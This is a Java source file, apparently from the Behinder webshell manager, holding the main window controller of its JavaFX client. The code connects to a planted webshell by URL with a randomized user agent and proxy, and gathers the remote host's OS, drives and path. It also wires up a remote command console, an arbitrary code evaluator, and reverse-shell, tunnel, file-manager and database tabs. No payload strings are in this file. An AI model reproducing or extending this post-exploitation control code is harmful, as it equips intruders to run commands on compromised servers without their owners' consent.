package net.rebeyond.behinder.ui.controller;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.GridPane;
import javafx.scene.paint.Color;
import javafx.scene.web.WebEngine;
import javafx.scene.web.WebView;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import org.json.JSONObject;

import java.nio.charset.StandardCharsets;
import java.util.*;

public class MainWindowController {
    private final Map<String, String> basicInfoMap = new HashMap<String, String>();
    private final List<Thread> workList = new ArrayList<Thread>();
    @FXML
    private GridPane mainGridPane;
    @FXML
    private TabPane mainTabPane;
    @FXML
    private WebView basicInfoView;
    @FXML
    private TextField urlText;
    @FXML
    private TextArea cmdTextArea;
    @FXML
    private Label statusLabel;
    @FXML
    private Label connStatusLabel;
    @FXML
    private Label versionLabel;
    @FXML
    private TextArea sourceCodeTextArea;
    @FXML
    private TextArea sourceResultArea;
    @FXML
    private Button runCodeBtn;
    @FXML
    private Tab realCmdTab;
    private JSONObject shellEntity;
    private ShellService currentShellService;
    private ShellManager shellManager;
    @FXML
    private AnchorPane pluginView;
    @FXML
    private PluginViewController pluginViewController;
    @FXML
    private FileManagerViewController fileManagerViewController;
    @FXML
    private ReverseViewController reverseViewController;
    @FXML
    private DatabaseViewController databaseViewController;
    @FXML
    private RealCmdViewController realCmdViewController;
    @FXML
    private TunnelViewController tunnelViewController;

    public MainWindowController() {
    }

    public void initialize() {
        this.initControls();
    }

    public List<Thread> getWorkList() {
        return this.workList;
    }

    private void initControls() {
        this.versionLabel.setText(String.format(this.versionLabel.getText(), Constants.VERSION));
        this.urlText.textProperty().addListener((observable, oldValue, newValue) -> {
            try {
                this.statusLabel.setText("正在获取基本信息，请稍后……");
                this.connStatusLabel.setText("正在连接");
                WebEngine webengine = this.basicInfoView.getEngine();
                Runnable runner = () -> {
                    try {
                        this.doConnect();
                        JSONObject basicInfoObj = new JSONObject(this.currentShellService.getBasicInfo());
                        final String basicInfoStr = new String(Base64.decode(basicInfoObj.getString("basicInfo")), StandardCharsets.UTF_8);
                        String driveList = (new String(Base64.decode(basicInfoObj.getString("driveList")), StandardCharsets.UTF_8)).replace(":\\", ":/");
                        String currentPath = new String(Base64.decode(basicInfoObj.getString("currentPath")), StandardCharsets.UTF_8);
                        String osInfo = (new String(Base64.decode(basicInfoObj.getString("osInfo")), StandardCharsets.UTF_8)).toLowerCase();
                        this.basicInfoMap.put("basicInfo", basicInfoStr);
                        this.basicInfoMap.put("driveList", driveList);
                        this.basicInfoMap.put("currentPath", currentPath);
                        this.basicInfoMap.put("osInfo", osInfo.replace("winnt", "windows"));
                        this.shellManager.updateOsInfo(this.shellEntity.getInt("id"), osInfo);
                        Platform.runLater(() -> {
                            webengine.loadContent(basicInfoStr);

                            try {
                                MainWindowController.this.initCmdView();
                                MainWindowController.this.realCmdViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel, MainWindowController.this.basicInfoMap);
                                MainWindowController.this.initSourceCodeView();
                                MainWindowController.this.pluginViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel, MainWindowController.this.shellManager);
                                MainWindowController.this.fileManagerViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel, MainWindowController.this.basicInfoMap);
                                MainWindowController.this.reverseViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel);
                                MainWindowController.this.databaseViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel);
                                MainWindowController.this.tunnelViewController.init(MainWindowController.this.currentShellService, MainWindowController.this.workList, MainWindowController.this.statusLabel);
                            } catch (Exception var2) {
                                var2.printStackTrace();
                            }

                            MainWindowController.this.connStatusLabel.setText("已连接");
                            MainWindowController.this.statusLabel.setText("[OK]连接成功，基本信息获取完成。");
                        });
                    } catch (final Exception var7) {
                        Platform.runLater(() -> {
                            MainWindowController.this.initCmdView();
                            var7.printStackTrace();
                            MainWindowController.this.connStatusLabel.setText("连接失败");
                            MainWindowController.this.connStatusLabel.setTextFill(Color.RED);
                            MainWindowController.this.statusLabel.setText("[ERROR]连接失败：" + var7.getMessage());
                        });
                    }

                };
                Thread workThread = new Thread(runner);
                this.workList.add(workThread);
                workThread.start();
            } catch (Exception var7) {
                var7.printStackTrace();
            }

        });
        this.mainTabPane.getSelectionModel().selectedItemProperty().addListener((observable, oldValue, newValue) -> {
            String tabId = newValue.getId();
            byte var6 = -1;
            switch (tabId.hashCode()) {
                case -1356954629:
                    if (tabId.equals("cmdTab")) {
                        var6 = 0;
                    }
                    break;
                case 0:
                    if (tabId.equals("")) {
                        var6 = 1;
                    }
            }

            switch (var6) {
                case 0:
                    MainWindowController.this.cmdTextArea.requestFocus();
                    MainWindowController.this.cmdTextArea.end();
                case 1:
                default:
            }
        });
    }

    private void initCmdView() {
        String currentPath = this.basicInfoMap.get("currentPath");
        this.cmdTextArea.setText(currentPath + " >");
    }

    private void initSourceCodeView() {
        this.runCodeBtn.setOnAction((event) -> {
            this.runSourceCode();
        });
    }

    private void runSourceCode() {
        this.statusLabel.setText("正在执行……");
        Runnable runner = () -> {
            try {
                String result = this.currentShellService.eval(this.sourceCodeTextArea.getText());
                Platform.runLater(() -> {
                    this.sourceResultArea.setText(result);
                    this.statusLabel.setText("完成。");
                });
            } catch (Exception var2) {
                var2.printStackTrace();
                Platform.runLater(() -> {
                    this.statusLabel.setText("运行失败:" + var2.getMessage());
                    this.sourceResultArea.setText(var2.getMessage());
                });
            }

        };
        Thread workThread = new Thread(runner);
        this.workList.add(workThread);
        workThread.start();
    }

    public void onCMDKeyPressed(KeyEvent keyEvent) {
        KeyCode keyCode = keyEvent.getCode();
        int lineCount = this.cmdTextArea.getParagraphs().size();
        String lastLine = this.cmdTextArea.getParagraphs().get(lineCount - 1).toString();
        if (keyCode == KeyCode.ENTER) {
            this.statusLabel.setText("[!]正在执行命令，请稍后……");
            int cmdStart = lastLine.indexOf(">") + 1;
            String cmd = lastLine.substring(cmdStart).trim();
            Runnable runner = () -> {
                try {
                    final JSONObject resultObj = this.currentShellService.runCmd(cmd);
                    final String statusText = resultObj.getString("status").equals("success") ? "[+]命令执行成功。" : "[-]命令执行失败。";
                    Platform.runLater(() -> {
                        MainWindowController.this.statusLabel.setText(statusText);
                        MainWindowController.this.cmdTextArea.appendText("\n" + resultObj.getString("msg") + "\n");
                        MainWindowController.this.cmdTextArea.appendText(MainWindowController.this.basicInfoMap.get("currentPath") + " >");
                    });
                } catch (final Exception var4) {
                    Platform.runLater(() -> MainWindowController.this.statusLabel.setText("[-]操作失败:" + var4.getMessage()));
                }

            };
            Thread workThread = new Thread(runner);
            this.workList.add(workThread);
            workThread.start();
            keyEvent.consume();
        }

    }

    private void doConnect() throws Exception {
        boolean connectResult = this.currentShellService.doConnect();
    }

    private String getCurrentUserAgent() {
        int uaIndex = (new Random()).nextInt(Constants.userAgents.length - 1);
        String currentUserAgent = Constants.userAgents[uaIndex];
        return currentUserAgent;
    }

    public void init(JSONObject shellEntity, ShellManager shellManager, Map<String, Object> currentProxy) throws Exception {
        this.shellEntity = shellEntity;
        this.shellManager = shellManager;
        this.currentShellService = new ShellService(shellEntity, this.getCurrentUserAgent());
        ShellService var10000 = this.currentShellService;
        ShellService.setProxy(currentProxy);
        this.urlText.setText(shellEntity.getString("url"));
    }

    private void initTabs() {
        if (this.shellEntity.getString("type").equals("asp")) {
            Iterator<Tab> var1 = this.mainTabPane.getTabs().iterator();

            while (true) {
                Tab tab;
                do {
                    if (!var1.hasNext()) {
                        return;
                    }

                    tab = var1.next();
                } while (!tab.getId().equals("realCmdTab") && !tab.getId().equals("tunnelTab") && !tab.getId().equals("reverseTab"));

                tab.setDisable(true);
            }
        }
    }
}
